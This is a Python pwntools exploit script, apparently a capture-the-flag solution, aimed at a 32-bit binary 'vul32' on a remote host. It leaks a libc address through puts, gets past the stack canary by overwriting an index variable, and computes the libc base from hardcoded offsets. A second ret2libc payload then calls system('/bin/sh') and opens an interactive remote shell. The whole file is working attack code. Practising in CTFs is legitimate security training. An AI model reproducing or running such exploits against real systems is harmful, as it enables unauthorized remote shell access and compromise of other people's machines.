#-*- coding:utf-8 -*-
#!/usr/bin/env python
#chaihj 2018/12/21

from pwn import *
#from LibcSearcher import LibcSearcher  #查找libc偏移的第三方包
# sh = process('./vul32')
sh = remote('202.112.51.154', 20001)
vul32 = ELF('./vul32')  #交互程序

vul_puts = vul32.plt['puts']  #调用puts函数，泄漏vul32中的__libc_start_main地址
vul_libc_start_main_got = vul32.got['__libc_start_main']
vul_main = vul32.symbols['main']
payload = flat(['A' * 51 + 'G', vul_puts, vul_main, vul_libc_start_main_got]) #覆盖v1 和 修改下标v4直接绕过canary
sh.recv()
sh.sendline(payload)

sh.recvline()
libc_start_main_addr = u32(sh.recvline()[0:4])  #获得libc偏移,这里直接使用已经dump好的偏移地址
# libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
# _libc_start_main = libc.dump('__libc_start_main')
_libc_start_main = 0x18540
libc_base = libc_start_main_addr - _libc_start_main
# system_addr = libc_base + libc.dump("system")
# binsh_addr = libc_base + libc.dump('str_bin_sh')
libc_system = 0x0003a940
libc_str_bin_sh = 0x15902b
system_addr = libc_base + libc_system
binsh_addr = libc_base + libc_str_bin_sh
payload = flat(['A' * 51 + 'G', system_addr, 'aaaa', binsh_addr])  #调用system的/bin/sh,系统调用的返回地址改为‘aaaa’
sh.sendline(payload)

sh.interactive()